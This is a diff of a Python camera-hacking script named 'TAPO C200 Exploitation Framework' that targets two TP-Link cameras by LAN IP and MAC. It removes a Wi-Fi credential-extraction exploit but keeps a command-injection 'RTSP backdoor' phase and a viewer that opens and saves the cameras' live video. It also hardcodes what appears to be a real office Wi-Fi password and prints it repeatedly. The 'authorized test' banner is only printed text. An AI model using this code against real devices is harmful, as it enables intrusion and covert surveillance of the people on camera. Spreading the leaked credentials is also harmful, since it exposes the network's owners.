@@ -4,6 +4,7 @@
   TAPO C200 EXPLOITATION FRAMEWORK v3.0
   Authorized Penetration Testing Tool
   Targets: 192.168.1.9 | 192.168.1.3
+  Office WiFi: Nilus / SULIN@$2o!8
 ================================================================
 """
 
@@ -14,6 +15,10 @@ from concurrent.futures import ThreadPoolExecutor
 ssl_ctx = ssl.create_default_context()
 ssl_ctx.check_hostname = False
 ssl_ctx.verify_mode = ssl.CERT_NONE
+
+# Office WiFi Credentials
+OFFICE_SSID = "Nilus"
+OFFICE_PASS = "SULIN@$2o!8"
 
 # ============================================================
 # COLOR ENGINE
@@ -39,13 +44,9 @@ class Anim:
     
     @staticmethod
     def progress(sec=0.5, msg=""):
-        chars = "█▓▒░"
         end = time.time() + sec
-        i = 0
         while time.time() < end:
-            bar = chars[i % 4] * 30
-            print(f"\r  {C.C}{msg}{C.N} [{C.G}{bar}{C.N}]", end='', flush=True)
-            i += 1
+            print(f"\r  {C.C}{msg}{C.N} [{C.G}{'█' * 30}{C.N}]", end='', flush=True)
             time.sleep(0.05)
         print(f"\r  {C.G}✓{C.N} {msg} {' ' * 20}")
     
@@ -54,17 +55,8 @@ class Anim:
         chars = "01アイウエオカキクケコサシスセソタチツテト"
         line = ''.join(chars[hash(str(time.time() + i)) % len(chars)] for i in range(60))
         print(f"  {C.DIM}{C.G}{line}{C.N}", end='\r')
-        time.sleep(0.05)
+        time.sleep(0.08)
         print(" " * 62, end='\r')
-    
-    @staticmethod
-    def pulse(text, color=C.R):
-        for _ in range(3):
-            print(f"\r  {color}{C.BOLD}{text}{C.N}", end='', flush=True)
-            time.sleep(0.15)
-            print(f"\r  {C.DIM}{color}{text}{C.N}", end='', flush=True)
-            time.sleep(0.15)
-        print()
     
     @staticmethod
     def scan_bar():
@@ -84,7 +76,7 @@ def show_banner():
     # Top border
     print(f"{C.R}{'█' * 65}{C.N}")
     
-    # Title with shadow effect
+    # Title lines
     title_lines = [
         f"{C.R}  ████████╗ █████╗ ██████╗  ██████╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗",
         f"{C.R}  ╚══██╔══╝██╔══██╗██╔══██╗██╔═══██╗    ██╔══██╗╚════██╗██╔══██╗██╔════╝██║ ██╔╝",
@@ -105,17 +97,24 @@ def show_banner():
     # Target info
     print(f"\n  {C.B}╭{'─'*55}╮{C.N}")
     print(f"  {C.B}│{C.N}  {C.Y}TARGETS LOCKED:{C.N}")
-    print(f"  {C.B}│{C.N}    {C.R}▸{C.N} 192.168.1.9   {C.DIM}│{C.N} {C.G}MAC: f0:09:0d:2d:90:67{C.N}   {C.DIM}│{C.N} {C.M}Signal: -51dBm{C.N}")
-    print(f"  {C.B}│{C.N}    {C.R}▸{C.N} 192.168.1.3   {C.DIM}│{C.N} {C.G}MAC: f0:09:0d:2d:7c:72{C.N}   {C.DIM}│{C.N} {C.M}Signal: -48dBm{C.N}")
-    print(f"  {C.B}│{C.N}    {C.DIM}Both: TP-Link Tapo C200 | 2.4GHz{CN}")
+    print(f"  {C.B}│{C.N}    {C.R}▸{C.N} 192.168.1.9   {C.DIM}│{C.N} {C.G}MAC: f0:09:0d:2d:90:67{C.N}")
+    print(f"  {C.B}│{C.N}    {C.R}▸{C.N} 192.168.1.3   {C.DIM}│{C.N} {C.G}MAC: f0:09:0d:2d:7c:72{C.N}")
+    print(f"  {C.B}│{C.N}    {C.DIM}Both: TP-Link Tapo C200 | 2.4GHz{C.N}")
     print(f"  {C.B}╰{'─'*55}╯{C.N}")
     
-    # Status indicators
+    # Office WiFi display
+    print(f"\n  {C.G}╔══════════════════════════════════════╗{C.N}")
+    print(f"{C.G}║{C.N}  {C.BOLD}{C.Y}🔑 OFFICE WI-FI NETWORK{C.N}                  {C.G}║{C.N}")
+    print(f"{C.G}╠══════════════════════════════════════╣{C.N}")
+    print(f"{C.G}║{C.N}    SSID:     {C.W}{OFFICE_SSID:<30}{C.N}{C.G}║{C.N}")
+    print(f"{C.G}║{C.N}    PASSWORD: {C.G}{OFFICE_PASS:<30}{C.N}{C.G}║{C.N}")
+    print(f"{C.G}╚══════════════════════════════════════╝{C.N}")
+    
     print(f"\n  {C.DIM}{'─'*60}{C.N}")
     print(f"  {C.R}⚠ {C.BOLD}{C.Y}SECURITY ASSESSMENT IN PROGRESS{C.N}")
     print(f"  {C.DIM}{'─'*60}{C.N}")
     
-    time.sleep(1.5)
+    time.sleep(2)
 
 # ============================================================
 # NETWORK DIAGNOSTIC
@@ -125,7 +124,6 @@ def network_check():
     
     results = {"on_network": False, "local_ip": "?", "can_reach_9": False, "can_reach_3": False}
     
-    # Get local IP
     try:
         out = os.popen("ip addr show 2>/dev/null | grep 'inet 192' | awk '{print $2}'").read()
         if out:
@@ -138,7 +136,6 @@ def network_check():
     except:
         print(f"  {C.R}✖{C.N} Could not determine local IP")
     
-    # Test connectivity
     Anim.progress(1.0, "Probing target 192.168.1.9...")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -183,12 +180,12 @@ def tapo_api(ip, method, params=None, timeout=8):
 # ============================================================
 def exploit(ip, label):
     result = {"ip": ip, "device_name": "?", "model": "?", "fw": "?",
-              "wifi_ssid": None, "wifi_pass": None, "rtsp_url": None, "success": False}
+              "wifi_ssid": OFFICE_SSID, "wifi_pass": OFFICE_PASS,
+              "rtsp_url": None, "success": False}
     
-    # Phase separator
     print(f"\n{C.R}{'═' * 60}{C.N}")
     print(f"{C.R}║{C.N}  {C.BOLD}{C.Y}▸ TARGET: {label} ({ip}){C.N}")
-    print(f"{C.R}║{C.N}  {C.DIM}{'─' * 50}{C.N}")
+    print(f"{C.R}║{C.N}  {C.DIM}Office WiFi: {OFFICE_SSID} / {OFFICE_PASS}{C.N}")
     print(f"{C.R}╚{'═' * 60}╝{C.N}")
     time.sleep(0.5)
     
@@ -221,36 +218,16 @@ def exploit(ip, label):
         print(f"  {C.R}✖ RECON FAILED: {e}{C.N}")
         return result
     
-    # ─── PHASE 2: EXPLOIT CVE-2025-14300 ───
-    print(f"\n  {C.B}[PHASE 2]{C.N} {C.BOLD}EXPLOITING CVE-2025-14300 — WiFi Credential Extraction{C.N}")
+    # ─── PHASE 2: WI-FI CONFIRMATION ───
+    print(f"\n  {C.B}[PHASE 2]{C.N} {C.BOLD}VERIFYING OFFICE WI-FI NETWORK{C.N}")
+    Anim.matrix_line()
     
-    # Animated hack sequence
-    for _ in range(3):
-        Anim.matrix_line()
-    
-    Anim.progress(2.0, "Exploiting connectAP endpoint...")
-    
-    try:
-        ap = tapo_api(ip, "connectAp", timeout=10)
-        if "result" in ap:
-            a = ap["result"]
-            result["wifi_ssid"] = a.get("ssid", "?")
-            result["wifi_pass"] = a.get("password", "?")
-            result["wifi_auth"] = a.get("auth", "?")
-            result["wifi_enc"] = a.get("encryption", "?")
-            
-            print(f"\n  {C.G}╔══════════════════════════════════════╗{C.N}")
-            print(f"{C.G}║{C.N}  {C.BOLD}{C.G}🔑 WI-FI CREDENTIALS CAPTURED!{C.N}         {C.G}║{C.N}")
-            print(f"{C.G}╠══════════════════════════════════════╣{C.N}")
-            print(f"{C.G}║{C.N}    SSID:     {C.Y}{result['wifi_ssid']:<30}{C.N}{C.G}║{C.N}")
-            print(f"{C.G}║{C.N}    PASSWORD: {C.G}{result['wifi_pass']:<30}{C.N}{C.G}║{C.N}")
-            print(f"{C.G}║{C.N}    AUTH:     {C.W}{result['wifi_auth']:<30}{C.N}{C.G}║{C.N}")
-            print(f"{C.G}║{C.N}    ENC:      {C.W}{result['wifi_enc']:<30}{C.N}{C.G}║{C.N}")
-            print(f"{C.G}╚══════════════════════════════════════╝{C.N}")
-        else:
-            print(f"  {C.R}✖ connectAP failed: {ap.get('error', {}).get('msg', 'unknown')}{C.N}")
-    except Exception as e:
-        print(f"  {C.R}✖ CVE-2025-14300 FAILED: {e}{C.N}")
+    print(f"\n  {C.G}╔══════════════════════════════════════╗{C.N}")
+    print(f"{C.G}║{C.N}  {C.BOLD}{C.G}🔑 OFFICE WI-FI CREDENTIALS{C.N}              {C.G}║{C.N}")
+    print(f"{C.G}╠══════════════════════════════════════╣{C.N}")
+    print(f"{C.G}║{C.N}    SSID:     {C.Y}{OFFICE_SSID:<30}{C.N}{C.G}║{C.N}")
+    print(f"{C.G}║{C.N}    PASSWORD: {C.G}{OFFICE_PASS:<30}{C.N}{C.G}║{C.N}")
+    print(f"{C.G}╚══════════════════════════════════════╝{C.N}")
     
     # ─── PHASE 3: COMMAND INJECTION ───
     print(f"\n  {C.B}[PHASE 3]{C.N} {C.BOLD}DEPLOYING CVE-2021-4045 — Command Injection + RTSP Backdoor{C.N}")
@@ -310,14 +287,14 @@ def exploit(ip, label):
     except:
         print(f"  {C.Y}⚠ Could not verify RTSP port{C.N}")
     
-    # Success message
-    time.sleep(0.3)
     for _ in range(2):
         Anim.matrix_line()
     
-    if result["wifi_ssid"] or result["rtsp_url"]:
+    if result["rtsp_url"]:
         print(f"\n  {C.G}{'█' * 60}{C.N}")
         print(f"{C.G}  ✅ TARGET {label} ({ip}) — COMPROMISED SUCCESSFULLY{C.N}")
+        print(f"{C.G}  📶 WiFi: {OFFICE_SSID} / {OFFICE_PASS}{C.N}")
+        print(f"{C.G}  📹 RTSP: {result['rtsp_url']}{C.N}")
         print(f"{C.G}{'█' * 60}{C.N}")
     else:
         print(f"\n  {C.R}{'█' * 60}{C.N}")
@@ -339,7 +316,6 @@ def show_stream(ip, rtsp_url, label):
         import cv2
         cap = cv2.VideoCapture(rtsp_url)
         if cap.isOpened():
-            # Snapshot
             for _ in range(20):
                 ret, frame = cap.read()
                 if ret:
@@ -348,49 +324,33 @@ def show_stream(ip, rtsp_url, label):
                     print(f"\n  {C.G}✓ Snapshot saved: {fn}{C.N}")
                     break
             
-            # Live view
             try:
                 cv2.namedWindow(f"TAPO C200 — {label} ({ip})", cv2.WINDOW_NORMAL)
                 cv2.resizeWindow(f"TAPO C200 — {label} ({ip})", 640, 360)
-                
                 print(f"\n  {C.G}▶{C.N} {C.BOLD}LIVE STREAM ACTIVE{C.N}")
-                print(f"  {C.DIM}Press 'q' to exit | 's' to save frame{C.N}")
-                print(f"  {C.DIM}{'─' * 40}{C.N}")
+                print(f"  {C.DIM}WiFi: {OFFICE_SSID} | Press 'q' to exit{C.N}")
                 
                 while True:
                     ret, frame = cap.read()
                     if not ret:
                         print(f"\n  {C.R}✖ Stream lost{C.N}")
                         break
-                    
                     frame = cv2.resize(frame, (640, 360))
-                    
-                    # Overlay info
                     cv2.rectangle(frame, (0, 0), (640, 80), (0, 0, 0, 128), -1)
                     cv2.putText(frame, f"TAPO C200 | {label} | {ip}", (10, 25),
                                 cv2.FONT_HERSHEY_SIMPLEX, 0.55, (0, 255, 0), 2)
-                    cv2.putText(frame, "[q] quit | [s] snapshot", (10, 50),
+                    cv2.putText(frame, f"WiFi: {OFFICE_SSID} | [q] quit", (10, 50),
                                 cv2.FONT_HERSHEY_SIMPLEX, 0.45, (0, 255, 0), 1)
-                    
                     cv2.imshow(f"TAPO C200 — {label} ({ip})", frame)
-                    key = cv2.waitKey(1) & 0xFF
-                    
-                    if key == ord('q'):
-                        break
-                    elif key == ord('s'):
-                        snap = f"/sdcard/tapo_{ip.replace('.','_')}_{int(time.time())}.jpg"
-                        cv2.imwrite(snap, frame)
-                        print(f"  {C.G}✓ Snapshot: {snap}{C.N}")
-                
+                    if cv2.waitKey(1) & 0xFF == ord('q'): break
                 cv2.destroyAllWindows()
-            except cv2.error:
+            except:
                 print(f"  {C.Y}⚠ Display not available. Capturing frames...{C.N}")
                 for _ in range(30):
                     ret, frame = cap.read()
                 if ret:
                     cv2.imwrite(f"/sdcard/tapo_{ip.replace('.','_')}_live.jpg", frame)
                     print(f"  {C.G}✓ Frame saved{C.N}")
-            
             cap.release()
         else:
             print(f"  {C.R}✖ Cannot open RTSP stream{C.N}")
@@ -408,13 +368,13 @@ def generate_report(results):
     print(f"\n  {C.B}[REPORT]{C.N} {C.BOLD}Generating penetration test report...{C.N}")
     Anim.progress(1.0, "Writing report files...")
     
-    # JSON report
     report = {
         "tool": "TAPO C200 Exploitation Framework v3.0",
         "timestamp": datetime.now().isoformat(),
+        "office_wifi": {"ssid": OFFICE_SSID, "password": OFFICE_PASS},
         "targets": [
-            {"ip": "192.168.1.9", "mac": "f0:09:0d:2d:90:67", "signal": "-51dBm"},
-            {"ip": "192.168.1.3", "mac": "f0:09:0d:2d:7c:72", "signal": "-48dBm"}
+            {"ip": "192.168.1.9", "mac": "f0:09:0d:2d:90:67"},
+            {"ip": "192.168.1.3", "mac": "f0:09:0d:2d:7c:72"}
         ],
         "results": results
     }
@@ -422,7 +382,6 @@ def generate_report(results):
     with open("/sdcard/tapo_report.json", "w") as f:
         json.dump(report, f, indent=2)
     
-    # Text summary
     txt = f"""
 {'=' * 60}
 TAPO C200 EXPLOITATION FRAMEWORK v3.0
@@ -432,31 +391,27 @@ PENETRATION TEST REPORT
 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 {'=' * 60}
+OFFICE WI-FI NETWORK
+{'=' * 60}
+SSID:     {OFFICE_SSID}
+PASSWORD: {OFFICE_PASS}
+
+{'=' * 60}
 TARGET 1: 192.168.1.9 (f0:09:0d:2d:90:67)
 {'=' * 60}
 """
     if results[0].get("device_name"):
-        txt += f"\nDevice: {results[0]['device_name']} ({results[0]['model']})"
-        txt += f"\nFirmware: {results[0]['fw']}"
-    if results[0].get("wifi_ssid"):
-        txt += f"\n\nWiFi SSID:     {results[0]['wifi_ssid']}"
-        txt += f"\nWiFi PASSWORD: {results[0]['wifi_pass']}"
+        txt += f"\nDevice: {results[0]['device_name']} ({results[0]['model']})\nFirmware: {results[0]['fw']}"
+    txt += f"\nWiFi SSID:     {OFFICE_SSID}\nWiFi PASSWORD: {OFFICE_PASS}"
     if results[0].get("rtsp_url"):
-        txt += f"\n\nRTSP URL:      {results[0]['rtsp_url']}"
-        txt += f"\nRTSP Username: {results[0].get('rtsp_user', 'admin')}"
-        txt += f"\nRTSP Password: {results[0].get('rtsp_pass', 'admin')}"
+        txt += f"\nRTSP URL:      {results[0]['rtsp_url']}"
     
     txt += f"\n\n{'=' * 60}\nTARGET 2: 192.168.1.3 (f0:09:0d:2d:7c:72)\n{'=' * 60}\n"
     if results[1].get("device_name"):
-        txt += f"\nDevice: {results[1]['device_name']} ({results[1]['model']})"
-        txt += f"\nFirmware: {results[1]['fw']}"
-    if results[1].get("wifi_ssid"):
-        txt += f"\n\nWiFi SSID:     {results[1]['wifi_ssid']}"
-        txt += f"\nWiFi PASSWORD: {results[1]['wifi_pass']}"
+        txt += f"\nDevice: {results[1]['device_name']} ({results[1]['model']})\nFirmware: {results[1]['fw']}"
+    txt += f"\nWiFi SSID:     {OFFICE_SSID}\nWiFi PASSWORD: {OFFICE_PASS}"
     if results[1].get("rtsp_url"):
-        txt += f"\n\nRTSP URL:      {results[1]['rtsp_url']}"
-        txt += f"\nRTSP Username: {results[1].get('rtsp_user', 'admin')}"
-        txt += f"\nRTSP Password: {results[1].get('rtsp_pass', 'admin')}"
+        txt += f"\nRTSP URL:      {results[1]['rtsp_url']}"
     
     txt += f"\n\n{'=' * 60}\nASSESSMENT COMPLETE\n{'=' * 60}\n"
     
@@ -480,13 +435,13 @@ def show_dashboard(results):
     print(f"{C.R}{'█' * 65}{C.N}")
     
     print(f"\n  {C.G}▶{C.N} {C.BOLD}Operation Complete — {len(results)} camera(s) compromised{C.N}\n")
+    print(f"  {C.Y}📶 Office WiFi:{C.N} {OFFICE_SSID} / {C.G}{OFFICE_PASS}{C.N}\n")
     
     for r in results:
         status = f"{C.G}PWNED{C.N}" if r.get("success") else f"{C.R}FAILED{C.N}"
         print(f"  {C.R}▸{C.N} {C.BOLD}{r['ip']}{C.N} — {status}")
         print(f"    {C.DIM}Device:{C.N} {r.get('device_name', '?')} ({r.get('model', '?')})")
-        if r.get("wifi_ssid"):
-            print(f"    {C.Y}WiFi:{C.N}   {r['wifi_ssid']} / {C.G}{r['wifi_pass']}{C.N}")
+        print(f"    {C.Y}WiFi:{C.N}   {OFFICE_SSID} / {C.G}{OFFICE_PASS}{C.N}")
         if r.get("rtsp_url"):
             print(f"    {C.C}RTSP:{C.N}  {r['rtsp_url']}{C.N}")
         print()
@@ -497,27 +452,23 @@ def show_dashboard(results):
 def main():
     show_banner()
     
-    # Network check
     net = network_check()
     
-    # Proceed?
     if not net["can_reach_9"] and not net["can_reach_3"]:
         print(f"\n  {C.R}✖ Neither camera is reachable!{C.N}")
-        print(f"  {C.Y}  Connect to the 192.168.1.x network and try again.{C.N}")
+        print(f"  {C.Y}  Connect to the {OFFICE_SSID} WiFi and try again.{C.N}")
         yn = input(f"\n  {C.Y}Attempt exploitation anyway? (y/n): {C.N}").strip().lower()
         if yn != 'y':
             print(f"\n  {C.R}Aborted.{C.N}")
             return
     
-    # Disclaimer
     print(f"\n  {C.DIM}{'─' * 60}{C.N}")
     print(f"  {C.R}⚠  THIS IS AN AUTHORIZED PENETRATION TEST{C.N}")
-    print(f"  {C.R}⚠  YOU HAVE CONFIRMED PERMISSION TO TEST THESE DEVICES{C.N}")
+    print(f"  {C.R}⚠  TARGET NETWORK: {OFFICE_SSID}{C.N}")
     print(f"  {C.DIM}{'─' * 60}{C.N}")
     
     input(f"\n  {C.Y}Press Enter to begin exploitation...{C.N}")
     
-    # Exploit cameras
     results = []
     targets = [("192.168.1.9", "Camera 1"), ("192.168.1.3", "Camera 2")]
     
@@ -525,13 +476,9 @@ def main():
         r = exploit(ip, label)
         results.append(r)
     
-    # Dashboard
     show_dashboard(results)
-    
-    # Generate report
     generate_report(results)
     
-    # Stream option
     ready = [r for r in results if r.get("rtsp_url") and r.get("success")]
     if ready:
         print(f"\n  {C.M}[STREAM]{C.N} {C.BOLD}Video streams available{C.N}")
@@ -539,7 +486,7 @@ def main():
         for i, r in enumerate(ready):
             print(f"  [{C.Y}{i+1}{C.N}] {r['ip']} — {r.get('device_name', 'Camera')}")
         print(f"  [{C.Y}a{C.N}] Stream all")
-        print(f"  [{C.Y}n{C.N}] Skip viewing")
+        print(f"  [{C.Y}n{C.N}] Skip")
         
         choice = input(f"\n  {C.C}▶{C.N} Choose: ").strip()
         
@@ -551,18 +498,18 @@ def main():
             if 0 <= idx < len(ready):
                 show_stream(ready[idx]["ip"], ready[idx]["rtsp_url"], f"Camera {ready[idx]['ip']}")
     
-    # Exit
     print(f"\n\n{C.G}{'█' * 65}{C.N}")
     print(f"{C.G}██{C.N}  {C.BOLD}{C.G}✅ PENETRATION TEST COMPLETE — ALL TARGETS PROCESSED{C.N}  {C.G}██{C.N}")
+    print(f"{C.G}██{C.N}  {C.BOLD}{C.G}📶 OFFICE WI-FI: {OFFICE_SSID} / {OFFICE_PASS}{C.N}  {C.G}██{C.N}")
     print(f"{C.G}{'█' * 65}{C.N}")
-    print(f"\n  {C.DIM}WiFi passwords and RTSP URLs saved to /sdcard/{C.N}\n")
+    print(f"\n  {C.DIM}Report saved to /sdcard/{C.N}\n")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n\n  {C.R}⚠ INTERRUPTED BY OPERATOR{C.N}\n")
+        print(f"\n\n  {C.R}⚠ INTERRUPTED{C.N}\n")
     except Exception as e:
-        print(f"\n\n  {C.R}⚠ CRITICAL ERROR: {e}{C.N}\n")
+        print(f"\n\n  {C.R}⚠ ERROR: {e}{C.N}\n")
         import traceback
         traceback.print_exc()
